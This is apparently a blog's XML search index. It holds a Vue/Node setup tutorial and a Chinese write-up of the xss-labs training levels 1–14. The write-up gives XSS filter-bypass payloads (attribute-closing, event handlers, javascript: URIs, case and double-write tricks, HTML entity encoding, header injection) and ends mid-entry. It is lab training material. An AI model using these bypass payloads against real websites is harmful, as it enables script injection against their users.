<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Vue项目初始化</title>
      <link href="/posts/4224.html"/>
      <url>/posts/4224.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-node-js版本管理nvm"><a href="#1-node-js版本管理nvm" class="headerlink" title="1.node.js版本管理nvm"></a>1.node.js版本管理nvm</h3><ul><li>Ubuntu安装node.js</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#更新源安装必要的依赖项</span><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> build-essential libssl-dev<span class="token comment">#nvm的GitHub地址https://github.com/nvm-sh/nvm</span><span class="token comment">#官方命令安装</span><span class="token function">curl</span> -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.2/install.sh <span class="token operator">|</span> <span class="token function">bash</span><span class="token comment">#安装完过后系统会提示以下命令，执行以下命令使得「终端会话」能够识别nvm</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">NVM_DIR</span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$HOME</span>/.nvm"</span><span class="token punctuation">[</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token variable">$NVM_DIR</span>/nvm.sh"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>. <span class="token string">"<span class="token variable">$NVM_DIR</span>/nvm.sh"</span>  <span class="token comment"># This loads nvm</span><span class="token punctuation">[</span> <span class="token parameter variable">-s</span> <span class="token string">"<span class="token variable">$NVM_DIR</span>/bash_completion"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">\</span>. <span class="token string">"<span class="token variable">$NVM_DIR</span>/bash_completion"</span>  <span class="token comment"># This loads nvm bash_completion</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.imgtg.com/2023/05/22/OaoL8p.png"></p><ul><li>nvm相关命令</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nvm ls-remote                          <span class="token comment">#列出服务器上所有可用版本</span>nvm list                               <span class="token comment">#列出目前nvm里面安装的所有版本</span>nvm <span class="token function">install</span> node版本号                  <span class="token comment">#安装指定的node版本</span>nvm uninstall node版本号               <span class="token comment">#卸载指定的node版本</span>nvm use node版本号                     <span class="token comment">#使用指定的node版本</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-项目构建工具Vue-cli"><a href="#2-项目构建工具Vue-cli" class="headerlink" title="2.项目构建工具Vue-cli"></a>2.项目构建工具Vue-cli</h3><ul><li><p>node.js下的npm包管理工具</p></li><li><p>yarn包管理工具</p><p>因为npm的包管理工具的不够完善，在安装包的过程中可能会提示许多的warn，本来是没有错的，让人以为发生了错误。所以使用yarn来进行包管理。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Ubuntu安装yarn<span class="token function">curl</span> <span class="token parameter variable">-sS</span> https://dl.yarnpkg.com/debian/pubkey.gpg <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> -<span class="token builtin class-name">echo</span> <span class="token string">"deb https://dl.yarnpkg.com/debian/ stable main"</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/yarn.list<span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token function">yarn</span><span class="token comment">#注意，官网注释说，如果已经安装了nvm，避免node的影响，使用下面的语句进行安装</span><span class="token function">sudo</span> <span class="token function">apt</span> update <span class="token operator">&amp;&amp;</span> <span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> --no-install-recommends <span class="token function">yarn</span><span class="token function">yarn</span> <span class="token parameter variable">--version</span><span class="token comment">#卸载</span><span class="token function">sudo</span> <span class="token function">apt</span> remove <span class="token function">yarn</span><span class="token comment">#卸载yarn</span><span class="token function">sudo</span> <span class="token function">apt</span> remove autoremove<span class="token comment">#卸载yarn相关的依赖</span><span class="token comment">#基本命令使用</span><span class="token function">yarn</span> global <span class="token function">add</span> 包名           全局安装模块<span class="token function">yarn</span> <span class="token function">install</span>                   自动下载安装包的列表<span class="token function">yarn</span> init                      在当前目录下自动生成一个package.json配置文件，用于自动构建前端项目<span class="token function">yarn</span> remove                    卸载，移除包，或者模块<span class="token comment">#注意如果使global方式下载的，需要使用global的方式进行卸载</span><span class="token function">yarn</span> global remove 包名<span class="token function">yarn</span> publish                   作为一个开源包到官方维护的列表当中<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.imgtg.com/2023/05/22/OaoGxU.png" alt="image-20221204202230474"></p><p><img src="https://i.imgtg.com/2023/05/22/OaoQpY.png" alt="image-20221204205108383"></p></li><li><p>安装vue/cli</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">yarn</span> global add@vue/cli<span class="token comment">#要想Ubuntu终端使用安装好的包vue以及其他包，需要添加yarn包环境变量</span><span class="token function">yarn</span> global bin <span class="token comment">#查看环境变量</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$PATH</span>:/home/xxx/.yarn/bin"</span>#这里的路径未yarn global bin显示出来的路径<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.imgtg.com/2023/05/22/OaTWZ6.png"></p><p><img src="https://i.imgtg.com/2023/05/22/OaTbcP.png"></p><ul><li><p>创建vue项目</p><p>创建项目</p></li></ul><pre class="line-numbers language-Vue" data-language="Vue"><code class="language-Vue">vue crate 项目名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.imgtg.com/2023/05/22/OaTxOb.png" alt="OaTxOb.png"></p><pre><code> 选择项目类型</code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"> Please pick a preset: <span class="token punctuation">(</span>Use arrow keys<span class="token punctuation">)</span><span class="token comment">#安装配置</span>❯ Default <span class="token punctuation">(</span><span class="token punctuation">[</span>Vue <span class="token number">3</span><span class="token punctuation">]</span> babel, eslint<span class="token punctuation">)</span> <span class="token comment">#vue3.0，babel：语法转换器，转换成版本兼容      exlint：语法检测器</span>  Default <span class="token punctuation">(</span><span class="token punctuation">[</span>Vue <span class="token number">2</span><span class="token punctuation">]</span> babel, eslint<span class="token punctuation">)</span> <span class="token comment">#vue2.0</span>  Manually <span class="token keyword">select</span> features <span class="token comment">#手动自己选择</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​选择包管理器：默认选择yarn</p><p><img src="https://i.imgtg.com/2023/05/22/OaTz7l.png" alt="OaTz7l.png"></p><p>​如果安装过程中出现错误，需要进行多次安装</p><p><img src="https://i.imgtg.com/2023/05/22/OaTFLg.png" alt="OaTFLg.png"></p><p><img src="https://i.imgtg.com/2023/05/22/OaThuB.png" alt="OaThuB.png"></p><p>​访问链接即可安装成功</p><h3 id="3-使用vite进行项目构建"><a href="#3-使用vite进行项目构建" class="headerlink" title="3.使用vite进行项目构建"></a>3.使用vite进行项目构建</h3><ul><li>命令</li></ul><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">yarn create vite-app &lt;项目名称&gt;cd frontendnpm install (or `yarn`)npm run dev (or `yarn dev`)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-使用yarn管理下的vite目录结构"><a href="#4-使用yarn管理下的vite目录结构" class="headerlink" title="4.使用yarn管理下的vite目录结构"></a>4.使用yarn管理下的vite目录结构</h3><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">my<span class="token operator">-</span>app<span class="token operator">/</span>├── node_modules<span class="token operator">/</span>  <span class="token comment">//项目所需要的依赖项，文件比较大，在上传到GitHub或者发给别人时，需要删除，然后利用                yarn.lock。使用yarn install 来在本地安装</span>├── <span class="token keyword">public</span><span class="token operator">/</span>        <span class="token comment">//静态文件</span>│   ├── favicon<span class="token punctuation">.</span>ico│   ├── index<span class="token punctuation">.</span>html│   └── robots<span class="token punctuation">.</span>txt├── src<span class="token operator">/</span>          <span class="token comment">//项目源码</span>│   ├── App<span class="token punctuation">.</span>vue   <span class="token comment">//根组件</span>│   ├── assets<span class="token operator">/</span>│   │   └── logo<span class="token punctuation">.</span>png│   ├── components<span class="token operator">/</span> <span class="token comment">//该文件夹包含应用程序中的所有组件，每个组件都是一个 Vue 实例</span>│   │   └── HelloWorld<span class="token punctuation">.</span>vue│   ├── main<span class="token punctuation">.</span>js  <span class="token comment">//程序的入口</span>│   ├── router<span class="token operator">/</span> <span class="token comment">//该文件夹包含 Vue.js 的路由管理器，用于管理应用程序的 URL 和页面切换。每个路由文件都是一个函数，用于定义路由，通常包含一个 path 和一个 redirect 对象。</span>│   │   └── index<span class="token punctuation">.</span>js│   ├── store<span class="token operator">/</span> <span class="token comment">//该文件夹包含 Vuex 的状态管理库，用于管理应用程序的状态</span>│   │   └── index<span class="token punctuation">.</span>js│   └── views<span class="token operator">/</span>│       ├── About<span class="token punctuation">.</span>vue│       └── Home<span class="token punctuation">.</span>vue├── <span class="token punctuation">.</span>gitignore<span class="token comment">//该文件用于指定不应该被 Git 跟踪的文件和文件夹，例如 node_modules/</span>├── babel<span class="token punctuation">.</span>config<span class="token punctuation">.</span>js<span class="token comment">//该文件用于指定 Babel 的配置文件，用于优化 JavaScript 代码的语法和功能</span>├── index<span class="token punctuation">.</span>html<span class="token comment">//vue程序的入口</span>├── <span class="token keyword">package</span><span class="token punctuation">.</span>json<span class="token comment">//该文件用于指定项目的依赖项、版本号、插件等，是项目的依赖管理配置文件。</span>├── <span class="token constant">README</span><span class="token punctuation">.</span>md└── yarn<span class="token punctuation">.</span>lock <span class="token comment">//确切的依赖版本号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 编成学习 </tag>
            
            <tag> 项目经历 </tag>
            
            <tag> vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss实验</title>
      <link href="/posts/121.html"/>
      <url>/posts/121.html</url>
      
        <content type="html"><![CDATA[<h1 id="xss-labs"><a href="#xss-labs" class="headerlink" title="xss-labs"></a>xss-labs</h1><h2 id="level1（url中的参数修改）"><a href="#level1（url中的参数修改）" class="headerlink" title="level1（url中的参数修改）"></a>level1（url中的参数修改）</h2><p>1.url中的参数值(反射型)，被原封不动的显示在页面上</p><h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><ul><li>对url中的参数值进行修改过后，屏幕会显示相应的url的值。可以在这测试xss</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233522.png" style="zoom:50%;"><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>在url中写入测试代码</li></ul><img src="E:/markdown%E6%96%87%E4%BB%B6/typroaPic/64.png" style="zoom:50%;"><h2 id="level2（htmlspecialchars-str-过滤）"><a href="#level2（htmlspecialchars-str-过滤）" class="headerlink" title="level2（htmlspecialchars($str)过滤）"></a>level2（htmlspecialchars($str)过滤）</h2><p>2.js的&lt;&gt;过滤</p><h3 id="尝试-1"><a href="#尝试-1" class="headerlink" title="尝试"></a>尝试</h3><ul><li>在页面输入测试语句</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233531.png" style="zoom:50%;"><ul><li><p>查看网页源代码</p><p>由源代码①可知，网页对js的&lt;&gt;进行了过滤。由②可知测试语句被完整的写在value的位置了，并没有被浏览器所执行。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233540.png"></p><ul><li><p>参考文件的后台代码</p><p>在</p><h2>标签处使用了过滤函数，所以js代码的&lt;&gt;会被替换掉<p></p></h2></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233548.png"></p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>代码被写在value中了，考虑使得value中的代码被执行。使用闭合的思想。</p><p><strong>方法一</strong></p><ul><li><p>可以构造使value闭合，从而使浏览器执行测试代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span class="token comment">//&gt;</span>" 闭合value<span class="token operator">&gt;</span> 闭合input<span class="token comment">// 注释后面部分</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>方法二</strong></p><ul><li><p>闭合value，测试鼠标经过输入框</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">" onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>" 闭合value<span class="token comment">// </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><p><strong>方法三</strong></p><ul><li>闭合value，测试鼠标点击输入框</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">" onclick<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="level3（htmlspecialchars-str-过滤）"><a href="#level3（htmlspecialchars-str-过滤）" class="headerlink" title="level3（htmlspecialchars($str)过滤）"></a>level3（htmlspecialchars($str)过滤）</h2><h3 id="尝试-2"><a href="#尝试-2" class="headerlink" title="尝试"></a>尝试</h3><ul><li>后台对<h2>和input的value都进行了，htmlspecialchars($str)过滤。</h2></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233602.png"></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><ul><li><p>考虑input自身的一些特殊属性，构造没有&lt;&gt;的攻击语句</p><p>比如</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">onfocus<span class="token operator">=</span>javascript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>" onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>" onclick<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ul><h2 id="level4（htmlspecialchars-str-过滤-lt-gt-过滤）"><a href="#level4（htmlspecialchars-str-过滤-lt-gt-过滤）" class="headerlink" title="level4（htmlspecialchars($str)过滤+<>过滤）"></a>level4（htmlspecialchars($str)过滤+&lt;&gt;过滤）</h2><h3 id="尝试-3"><a href="#尝试-3" class="headerlink" title="尝试"></a>尝试</h3><ul><li>使用测试语句，根据反应查看网页源代码</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233609.png"></p><p>由网页源代码，①使用了htmlspecialchars($str)过滤。②则是把&lt;&gt;给过滤掉了</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><ul><li><p>考虑使用没有&lt;&gt;的代码，参考第三关</p></li><li><p>查看后台代码</p><p>可见后台是把&lt;&gt;进行了空替换</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233613.png"></p><h2 id="level5（关键字替换）"><a href="#level5（关键字替换）" class="headerlink" title="level5（关键字替换）"></a>level5（关键字替换）</h2><h3 id="尝试-4"><a href="#尝试-4" class="headerlink" title="尝试"></a>尝试</h3><ul><li>通过script ，不含&lt;&gt;的poc测试，通过网页源代码可以知道，后台对其进行了过滤</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233619.png"></p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233622.png" alt="9"></p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233626.png" alt="QQ截图20220814162338"></p><h3 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h3><ul><li>使用伪协议javascript: ，将javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面</li></ul><pre class="line-numbers language-none"><code class="language-none">"&gt; &lt;a href=javascript:alert(1)/a&gt;//<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>结果</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233635.png"></p><ul><li>后台代码的替换规则</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233638.png"></p><h2 id="level6（关键字替换-伪协议过滤）"><a href="#level6（关键字替换-伪协议过滤）" class="headerlink" title="level6（关键字替换+伪协议过滤）"></a>level6（关键字替换+伪协议过滤）</h2><h3 id="尝试-5"><a href="#尝试-5" class="headerlink" title="尝试"></a>尝试</h3><ul><li>使用常规语句，input属性，伪协议发现都有过滤</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233642.png"></p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233645.png" alt="QQ截图20220814162338"></p><h3 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h3><ul><li>尝试大小写绕过</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">&gt;</span><span class="token operator">&lt;</span>Script<span class="token operator">&gt;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233650.png"></p><ul><li><p>后台代码</p><p>由后台代码可以知道，后台对特定的字符进行转换（并没有把字符串准换为小写来进行过滤），以及htmlspecialchars($str)过滤。</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233656.png"></p><h2 id="level7（关键字替换为空）"><a href="#level7（关键字替换为空）" class="headerlink" title="level7（关键字替换为空）"></a>level7（关键字替换为空）</h2><h3 id="尝试-6"><a href="#尝试-6" class="headerlink" title="尝试"></a>尝试</h3><ul><li>把<script>替换为空，伪协议的javascript替换为java，input自身的属性也进行了过滤，</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233700.png"></p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233702.png" alt="17"></p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233705.png" alt="18"></p><h3 id="思路-6"><a href="#思路-6" class="headerlink" title="思路"></a>思路</h3><ul><li><p>双写绕过</p><p>注意value的闭合</p></li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">></span><span class="token operator">&lt;</span>scscriptript<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>scrscriptipt<span class="token operator">></span><span class="token comment">//</span>" oonnmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span>"<span class="token operator">></span> <span class="token operator">&lt;</span>a hhrefref<span class="token operator">=</span>javascscriptript<span class="token operator">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li><p>后台代码</p><p>后台使用了转小写的函数，把关键字script ,on,src,data,href进行了过滤。但缺点就是只过滤一次，可以进行双写，使过滤后的代码又闭合成代码</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233708.png"></p><h2 id="level8（过滤齐全）"><a href="#level8（过滤齐全）" class="headerlink" title="level8（过滤齐全）"></a>level8（过滤齐全）</h2><h3 id="尝试-7"><a href="#尝试-7" class="headerlink" title="尝试"></a>尝试</h3><ul><li>大小写，伪协议，input属性都被过滤了</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233723.png"></p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233725.png"></p><h3 id="思路-7"><a href="#思路-7" class="headerlink" title="思路"></a>思路</h3><ul><li>将html转化为字符实体</li></ul><blockquote><p>字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。</p><p>这么做的目的主要有两个：<br>１、解决HTML代码编写中的一些问题。例如需要在网页上显示小于号（<）和大于号（>），由于它们是HTML的预留标签，可能会被误解析。这时就需要将小于号和大于号写成字符实体：<br>小于号这样写：&lt; 或 &#60;<br>大于号这样写：&gt; 或 &#62;</p></blockquote><ul><li>转换结果</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233729.png"></p><ul><li><p>后台代码</p><p>由过滤方式可知这次过滤得比较齐全</p></li></ul><img src="E:/markdown%E6%96%87%E4%BB%B6/typroaPic/23-166046914652638.png" style="zoom:50%;" /><h2 id="level9（链接合法性检查）"><a href="#level9（链接合法性检查）" class="headerlink" title="level9（链接合法性检查）"></a>level9（链接合法性检查）</h2><h3 id="尝试-8"><a href="#尝试-8" class="headerlink" title="尝试"></a>尝试</h3><ul><li>这关与第九关有许多的相似之处，通过网页代码查看可以知道，该关增加了网页合法性的检查。其余的过滤都与第8关相似</li></ul><h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><ul><li>将html转化为字符实体，并在后面添加注释“http://”来使得网站合法</li></ul><pre class="line-numbers language-text" data-language="text"><code class="language-text">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;//http://<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>后端代码</p><p>关键字过滤的比较齐全，</p><blockquote><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p><p>注释：strpos() 函数是区分大小写的。</p></blockquote></li></ul><img src="E:/markdown%E6%96%87%E4%BB%B6/typroaPic/24.png" style="zoom:50%;" /><h2 id="level10（输入框隐藏）"><a href="#level10（输入框隐藏）" class="headerlink" title="level10（输入框隐藏）"></a>level10（输入框隐藏）</h2><h3 id="尝试-9"><a href="#尝试-9" class="headerlink" title="尝试"></a>尝试</h3><ul><li>没有输入框，尝试在地址栏进行输入测试代码，查看网页源代码发现<h2>使用了htmlspecialchars($str)过滤。</li><li>由于是地址栏，不能像input那样利用自身属性进行绕过。</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233743.png" style="zoom:50%;" /><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233747.png"></p><ul><li>检查网页时，发现有三个被隐藏的输入框，分别出去type值，让显示框出现，并输入测试代码。发现只有第三个输入框在输入测试代码过后，测试代码会被写进value里面。并且代码会过滤掉<></li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233749.png" style="zoom:67%;" /><h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><ul><li>去除第三个输入框的hidden，并且利用input的属性进行测试，注意代码的闭合</li></ul><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">"<span class="token operator">></span> onmouseover<span class="token operator">=</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>后台代码</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233753.png" style="zoom:50%;" /><h2 id="level11（http头部信息值）"><a href="#level11（http头部信息值）" class="headerlink" title="level11（http头部信息值）"></a>level11（http头部信息值）</h2><h3 id="尝试-10"><a href="#尝试-10" class="headerlink" title="尝试"></a>尝试</h3><ul><li><p>通过查看网页源代码，和10关比起来多了一个隐藏的t_ref，利用10关相同的尝试</p><p>发现测试语句">onmouseover-alert(1)//中的双引号和<>都被过滤了</p></li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233812.png" style="zoom: 67%;" /><h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><ul><li>t_ref的input属性value没有替换，可以看出是在参考referer的值</li></ul><blockquote><p> referer，它的意思是要告诉服务器，该请求来自哪里。比如在一个网页里面插入一个超链接，链接到其他的网页，那么当点击这个超链接从而链接到另外一个页面的时候，相当于浏览器向 web 服务器发送了一个 http 请求，对于另外一个页面而言，这个 referer 就是上一个页面的 URL，而对于从地址栏里面直接输入 URL 或者是刷新网页的方式，则 referer = null，通过设置这个 referer 可以防止盗链的问题</p></blockquote><ul><li><p>考虑抓包修改referer的值</p><pre class="line-numbers language-css" data-language="css"><code class="language-css">">onmouseover=<span class="token function">alert</span><span class="token punctuation">(</span>1<span class="token punctuation">)</span>//这里构造的是input的属性，这里的referer值是放入到t_ref的value当中的，所以需要注意闭合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233816.png" style="zoom:50%;" /><p><img src="/"><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233837.png" alt="31" style="zoom:67%;" /></p><ul><li><p>后台代码</p><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233828.png"></p></li></ul><h2 id="level12（http头部信息值）"><a href="#level12（http头部信息值）" class="headerlink" title="level12（http头部信息值）"></a>level12（http头部信息值）</h2><h3 id="尝试-11"><a href="#尝试-11" class="headerlink" title="尝试"></a>尝试</h3><ul><li><p>按F12进行检查发现，t_ua的input中的value值是http中User-Agent的信息</p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233904.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233858.png" alt="34" style="zoom:50%;" /><h3 id="思路-11"><a href="#思路-11" class="headerlink" title="思路"></a>思路</h3><ul><li>通过bp抓包修改User-Agent的值，来实现攻击代码</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233909.png" alt="35" style="zoom:67%;" /><ul><li>修该一下参数</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233915.png" alt="36" style="zoom:50%;" /></li><li><p>后端代码</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233925.png"></p><h2 id="level13（http头部信息值）"><a href="#level13（http头部信息值）" class="headerlink" title="level13（http头部信息值）"></a>level13（http头部信息值）</h2><h3 id="尝试-12"><a href="#尝试-12" class="headerlink" title="尝试"></a>尝试</h3><ul><li>按F12检查</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233931.png"></p><h3 id="思路-12"><a href="#思路-12" class="headerlink" title="思路"></a>思路</h3><ul><li>同上一关抓包修改</li></ul><p><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328233956.png"></p><ul><li>修改一下参数</li></ul><img src="https://cdn.jsdelivr.net/gh/togetherhkl/Mypictures/20230328234009.png" style="zoom:50%;" /><h2 id="level14（Exif检查）"><a href="#level14（Exif检查）" class="headerlink" title="level14（Exif检查）"></a>level14（Exif检查）</h2><h3 id="尝试-13"><a href="#尝试-13" class="headerlink" title="尝试"></a>尝试</h3><p><strong>知识点</strong></p><blockquote><p>  iframe一般用来包含别的页面，例如我们可以在我们自己的网站页面加载别人网站的内容，为了更好的效果，可能需要使iframe透明效果，那么就需要了解更多的iframe属性。</p></blockquote><blockquote><p>Exif: 可交换图像文件格式（英语：Exchangeable image file format，官方简称Exif），是专门为数码相机的照片设定的，可以记录数码照片的属性信息和拍摄数据。</p></blockquote><blockquote><p>有些网站有读取图片exif信息的功能，当网站读取到的恶意的exif信息就会触发这个payload</p></blockquote><p>通过查询信息可以知道，该关是通过<iframe>标签包含一个可以读取exif的网页，但是该网页的地址失效了。<strong>考点就是想让我们知道exif可能有XSS的漏洞</strong></p><img 